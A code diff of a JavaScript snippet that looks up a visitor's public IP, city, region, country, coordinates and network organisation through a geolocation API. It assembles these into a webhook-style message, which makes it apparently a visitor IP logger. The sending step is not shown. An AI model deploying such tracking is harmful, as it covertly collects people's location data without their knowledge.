@@ -3,16 +3,15 @@ const sessionId = crypto.randomUUID() || Date.now().toString(36) + Math.random()
 (async () => {
     try {
         // Fetch IP info
-        const info = await fetch('https://ipinfo.io/json').then(res => res.json());
+        const info = await fetch('http://ip-api.com/json').then(res => res.json());
 
         // Extract values with fallback
-        const ip = info.ip || 'Unknown';
+        const ip = info.query || 'Unknown';
         const city = info.city || 'Unknown';
-        const region = info.region || 'Unknown';
+        const region = info.regionName || 'Unknown';
         const country = info.country || 'Unknown';
-        const loc = info.loc || 'Unknown';
-        const org = info.org || 'Unknown';
-        const hostname = info.hostname || 'Unknown';
+        const loc = info.lat + "," + info.lon || 'Unknown';
+        const org = info.as || 'Unknown';
         const time = new Date().toISOString();
 
         // Construct message
@@ -25,7 +24,6 @@ const sessionId = crypto.randomUUID() || Date.now().toString(36) + Math.random()
             "**country:** `" + country + "`\n" +
             "**coords:** `" + loc + "`\n" +
             "**org:** `" + org + "`\n" +
-            "**host:** `" + hostname + "`\n" +
             "**time:** `" + time + "`";
         ;
 
